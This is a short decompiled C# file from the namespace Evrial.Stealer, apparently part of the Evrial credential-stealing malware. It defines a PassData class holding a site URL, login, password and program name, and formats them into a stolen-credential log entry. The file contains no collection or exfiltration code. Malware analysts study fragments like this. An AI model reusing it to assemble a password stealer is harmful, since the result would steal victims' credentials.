using System;

namespace Evrial.Stealer
{
	// Token: 0x02000013 RID: 19
	public class PassData
	{
		// Token: 0x17000007 RID: 7
		// (get) Token: 0x06000027 RID: 39 RVA: 0x00002D18 File Offset: 0x00000F18
		// (set) Token: 0x06000028 RID: 40 RVA: 0x00002D20 File Offset: 0x00000F20
		public string Url { get; set; }

		// Token: 0x17000008 RID: 8
		// (get) Token: 0x06000029 RID: 41 RVA: 0x00002D2C File Offset: 0x00000F2C
		// (set) Token: 0x0600002A RID: 42 RVA: 0x00002D34 File Offset: 0x00000F34
		public string Login { get; set; }

		// Token: 0x17000009 RID: 9
		// (get) Token: 0x0600002B RID: 43 RVA: 0x00002D40 File Offset: 0x00000F40
		// (set) Token: 0x0600002C RID: 44 RVA: 0x00002D48 File Offset: 0x00000F48
		public string Password { get; set; }

		// Token: 0x1700000A RID: 10
		// (get) Token: 0x0600002D RID: 45 RVA: 0x00002D54 File Offset: 0x00000F54
		// (set) Token: 0x0600002E RID: 46 RVA: 0x00002D5C File Offset: 0x00000F5C
		public string Program { get; set; }

		// Token: 0x0600002F RID: 47 RVA: 0x00002D68 File Offset: 0x00000F68
		public override string ToString()
		{
			return string.Format("SiteUrl : {0}\r\nLogin : {1}\r\nPassword : {2}\r\nProgram : {3}\r\n——————————————————————————————————", new object[]
			{
				this.Url,
				this.Login,
				this.Password,
				this.Program
			});
		}
	}
}
